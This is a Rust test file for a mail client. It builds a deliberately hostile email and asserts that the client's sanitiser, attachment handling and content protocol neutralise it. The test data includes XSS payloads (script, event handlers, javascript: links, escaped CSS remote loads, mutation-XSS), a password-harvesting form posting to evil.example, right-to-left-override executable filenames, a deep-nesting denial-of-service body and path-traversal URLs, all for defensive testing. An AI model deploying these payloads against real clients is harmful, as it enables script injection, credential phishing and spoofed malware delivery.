//! Hostile mail, end to end: a message built to attack the client goes through the fake Gmail
//! server, sync, body fetch and `mail.getMessage` / attachments / the `cmattach` protocol, and
//! nothing dangerous comes out.

use serde_json::{Value, json};

use crate::{accounts, ctx::AppCtx, rpc};

/// The HTML part: script, handlers, forms, frames, SVG/MathML, meta refresh, base, CSS remote
/// loads (plain, escaped, image-set, @import, fonts), javascript:/vbscript:/data: links, DOM
/// clobbering, tracking pixel.
pub const HOSTILE_HTML: &str = r#"<html><head><base href="https://evil.example/"><meta http-equiv="refresh" content="0;url=https://evil.example/refresh">
<link rel="stylesheet" href="https://evil.example/link.css"><script>alert('head')</script><style>
.a{background:u\72l(https://evil.example/esc1.png)} .b{background:url(\68ttp\3a //evil.example/esc2.png)}
@\69mport url(https://evil.example/esc3.css); @import "https://evil.example/plain.css";
.c{background-image:image-set("https://evil.example/set.png" 1x)} @font-face{font-family:x;src:url(https://evil.example/f.woff)}
</style></head><body background="https://evil.example/bg.png" onload="alert('body')">
<p class="a b c" style="font-family:x">Styled text</p>
<p>Links: <a href="javascript:alert(1)">js</a> <a href="vbscript:msgbox(1)">vbs</a> <a href="data:text/html,%3Cscript%3Ealert(1)%3C/script%3E">data</a>
<a href="https://ok.example/page" target="_top">a normal link</a></p>
<img name="addEventListener" src="cid:png1@x" alt="inline png"><img src="cid:svg1@x" alt="inline svg">
<img src="https://evil.example/pixel.gif" width="1" height="1"><img src="x" onerror="alert('img')">
<form action="https://evil.example/collect"><input name="password" type="password"><button>Sign in</button></form>
<svg onload="alert('svg')"><script>alert('svg2')</script><image href="https://evil.example/svg.png"/></svg>
<math><mtext><table><mglyph><style><img src=x onerror=alert('math')></style></mglyph></table></mtext></math>
<iframe src="https://evil.example/frame"></iframe><object data="https://evil.example/o"></object><embed src="https://evil.example/e">
<video src="https://evil.example/v.mp4" poster="https://evil.example/poster.png"></video>
<div style="background-image:image-set('https://evil.example/inline.png' 1x)">end of hostile body</div>
</body></html>"#;

const SVG: &str = r#"<svg xmlns="http://www.w3.org/2000/svg" onload="alert('svgfile')"><script>alert('svgfile2')</script><image href="https://evil.example/svgfile.png"/></svg>"#;
const PNG_B64: &str = "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==";

/// The whole message: the HTML above with an inline PNG and SVG, and attachments that try to get
/// a program opened (`evil.exe. .`, a right-to-left override name) plus an HTML page.
pub fn hostile_message(to: &str) -> String {
    let html = HOSTILE_HTML;
    format!(
        "From: \"Investor Relations \u{202E}moc.kab\u{202C}\" <attacker@evil.example>\r\n\
         To: {to}\r\nSubject: Hostile test message\r\nDate: Sun, 11 Oct 2026 08:00:00 +0000\r\n\
         Message-ID: <hostile-1@evil.example>\r\nMIME-Version: 1.0\r\n\
         Content-Type: multipart/mixed; boundary=\"B1\"\r\n\r\n\
         --B1\r\nContent-Type: multipart/related; boundary=\"B2\"\r\n\r\n\
         --B2\r\nContent-Type: text/html; charset=utf-8\r\n\r\n{html}\r\n\
         --B2\r\nContent-Type: image/png; name=\"p.png\"\r\nContent-ID: <png1@x>\r\nContent-Disposition: inline; filename=\"p.png\"\r\n\
         Content-Transfer-Encoding: base64\r\n\r\n{PNG_B64}\r\n\
         --B2\r\nContent-Type: image/svg+xml; name=\"logo.svg\"\r\nContent-ID: <svg1@x>\r\nContent-Disposition: inline; filename=\"logo.svg\"\r\n\r\n{SVG}\r\n\
         --B2--\r\n\
         --B1\r\nContent-Type: application/octet-stream; name=\"evil.exe. .\"\r\nContent-Disposition: attachment; filename=\"evil.exe. .\"\r\n\
         Content-Transfer-Encoding: base64\r\n\r\nTVqQAAMAAAAEAAAA\r\n\
         --B1\r\nContent-Type: application/pdf\r\nContent-Disposition: attachment; filename*=utf-8''invoice%E2%80%AEfdp.exe\r\n\
         Content-Transfer-Encoding: base64\r\n\r\nTVqQAAMAAAAEAAAA\r\n\
         --B1\r\nContent-Type: text/html; name=\"page.html\"\r\nContent-Disposition: attachment; filename=\"page.html\"\r\n\r\n\
         <html><body><script>alert('page')</script>A page</body></html>\r\n\
         --B1--\r\n"
    )
}

/// 40,000 nested elements (quadratic in html5ever / html2text without the depth guard).
pub fn deep_message(to: &str) -> String {
    let body = format!("{}deep but harmless{}", "<div><span>".repeat(20_000), "</span></div>".repeat(20_000));
    format!(
        "From: Deep <deep@evil.example>\r\nTo: {to}\r\nSubject: Deep nesting\r\nMIME-Version: 1.0\r\n\
         Content-Type: text/html; charset=utf-8\r\n\r\n{body}\r\n"
    )
}

fn code(e: &anyhow::Error) -> String {
    e.downcast_ref::<crate::error::UserError>().map(|u| u.code.to_string()).unwrap_or_default()
}

#[tokio::test]
async fn hostile_mail_end_to_end() {
    let (ctx, _g) = AppCtx::for_test().unwrap();
    let acct = accounts::upsert(&ctx.db, "kenny@duvz.demo", "Kenny Green", "demo").await.unwrap();
    let api = ctx.api(acct.id).await.unwrap();
    let reg = rpc::build();
    let deliver = |raw: String| {
        let api = api.clone();
        async move {
            let url = format!("{}/users/me/x-demo/deliverRaw", api.urls.gmail);
            let v: Value = api.post(&url, &[], json!({ "raw": crate::google::gmail::b64url_encode(raw.as_bytes()) })).await.unwrap();
            v["id"].as_str().unwrap().to_string()
        }
    };
    let gid = deliver(hostile_message("kenny@duvz.demo")).await;
    let deep_gid = deliver(deep_message("kenny@duvz.demo")).await;
    super::sync::sync_account(&ctx, &api).await.unwrap();
    let local = |g: String| {
        let ctx = ctx.clone();
        async move {
            ctx.db.read(move |c| Ok(c.query_row("SELECT id FROM messages WHERE gmail_id=?1", [g], |r| r.get::<_, i64>(0))?)).await.unwrap()
        }
    };
    let id = local(gid).await;

    let m = reg.call(ctx.clone(), "mail.getMessage", json!({ "id": id })).await.unwrap();
    let html = m["html"].as_str().unwrap().to_lowercase();
    assert_eq!(m["remoteBlocked"], true, "remote content is blocked by default");
    assert_eq!(m["fromName"], "Investor Relations moc.kab", "no bidi override in the sender name");
    for bad in [
        "evil.example",
        "<script",
        "onload",
        "onerror",
        "javascript:",
        "vbscript:",
        "data:text",
        "<base",
        "<meta",
        "<link",
        "<form",
        "<input",
        "<button",
        "<iframe",
        "<object",
        "<embed",
        "<svg",
        "<math",
        "<video",
        "@import",
        "target=",
        "name=\"addeventlistener\"",
    ] {
        assert!(!html.contains(bad), "{bad} survived in the reading pane: {html}");
    }
    assert!(html.contains("https://ok.example/page") && html.contains("end of hostile body"));
    // even with "Download Pictures" nothing executable or navigating survives
    let m2 = reg.call(ctx.clone(), "mail.getMessage", json!({ "id": id, "allowRemote": true })).await.unwrap();
    let h2 = m2["html"].as_str().unwrap().to_lowercase();
    for bad in ["<script", "onload", "onerror", "javascript:", "<base", "<meta", "<form", "<iframe", "@import"] {
        assert!(!h2.contains(bad), "{bad} survived with pictures allowed: {h2}");
    }

    // attachments
    let atts = m["attachments"].as_array().unwrap().clone();
    let by_name = |pred: &dyn Fn(&str) -> bool| atts.iter().find(|a| pred(a["filename"].as_str().unwrap())).cloned();
    assert!(atts.iter().all(|a| !a["filename"].as_str().unwrap().contains('\u{202E}')), "bidi controls removed: {atts:?}");
    let exe = by_name(&|n| n.starts_with("evil.exe")).expect("evil.exe attachment");
    let e = reg.call(ctx.clone(), "mail.openAttachment", json!({ "attachmentId": exe["id"], "confirmed": true })).await.unwrap_err();
    assert_eq!(code(&e), "unsafe", "{e:#}");
    let rlo = by_name(&|n| n.starts_with("invoice")).expect("rlo attachment");
    assert_eq!(rlo["filename"], "invoicefdp.exe");
    let e = reg.call(ctx.clone(), "mail.openAttachment", json!({ "attachmentId": rlo["id"], "confirmed": true })).await.unwrap_err();
    assert_eq!(code(&e), "unsafe");
    let page = by_name(&|n| n == "page.html").expect("html attachment");
    let e = reg.call(ctx.clone(), "mail.openAttachment", json!({ "attachmentId": page["id"] })).await.unwrap_err();
    assert_eq!(code(&e), "confirm_open");
    let opened = reg.call(ctx.clone(), "mail.openAttachment", json!({ "attachmentId": page["id"], "confirmed": true })).await.unwrap();
    #[cfg(windows)]
    {
        let mut ads = std::ffi::OsString::from(opened.as_str().unwrap());
        ads.push(":Zone.Identifier");
        assert!(std::fs::read_to_string(&ads).unwrap().contains("ZoneId=3"));
    }
    let _ = opened;
    // Save As keeps working for blocked types (marked as from the internet)
    let saved = ctx.data_dir.join("saved.bin");
    reg.call(ctx.clone(), "mail.saveAttachment", json!({ "attachmentId": exe["id"], "path": saved.to_string_lossy() })).await.unwrap();
    assert!(saved.exists());

    // the protocol never serves HTML / SVG as something the WebView would render
    for a in [&page, &by_name(&|n| n == "logo.svg").expect("svg")] {
        let resp = super::protocol_response(&ctx, &format!("/inline/{}", a["id"])).await;
        assert_eq!(resp.status(), 200);
        assert_eq!(resp.headers()["content-type"], "application/octet-stream", "{a}");
    }
    let png = by_name(&|n| n == "p.png").expect("png");
    let resp = super::protocol_response(&ctx, &format!("/inline/{}", png["id"])).await;
    assert_eq!(resp.headers()["content-type"], "image/png");
    // path tricks in the protocol URL are just "not found"
    for p in ["/inline/../../etc", "/att/abc", "/inline/", "/x/1", "/inline/999999"] {
        assert_eq!(super::protocol_response(&ctx, p).await.status(), 404, "{p}");
    }

    // replying quotes the original sanitised, without remote / script content
    let prep = reg.call(ctx.clone(), "mail.compose.prepare", json!({ "mode": "reply", "id": id })).await.unwrap();
    let q = prep["quotedHtml"].as_str().unwrap().to_lowercase();
    for bad in ["<script", "onload", "onerror", "javascript:", "<form", "<iframe", "<svg", "<base", "<meta"] {
        assert!(!q.contains(bad), "{bad} survived in the reply quote: {q}");
    }
    assert!(q.contains("data:image/png;base64,"), "inline picture embedded in the quote");

    // deep nesting: shown as text, quickly
    let deep = local(deep_gid).await;
    let t = std::time::Instant::now();
    let m = reg.call(ctx.clone(), "mail.getMessage", json!({ "id": deep })).await.unwrap();
    assert!(m["html"].as_str().unwrap().contains("deep but harmless"));
    assert!(t.elapsed().as_secs() < 3, "deep message took {:?}", t.elapsed());
}

#[test]
fn bidi_overrides_are_removed_from_names_and_subjects() {
    let a = super::mime::parse_addresses("\"Investor Relations \u{202E}moc.kab\u{202C}\" <attacker@evil.example>");
    assert_eq!(a[0].name, "Investor Relations moc.kab");
    let heb = super::mime::parse_addresses("\"\u{200F}שרה כהן\" <sarah@x.example>");
    assert_eq!(heb[0].name, "\u{200F}שרה כהן", "RLM kept");
    assert_eq!(super::mime::strip_bidi_overrides("Re: \u{2067}x\u{2069}"), "Re: x");
}
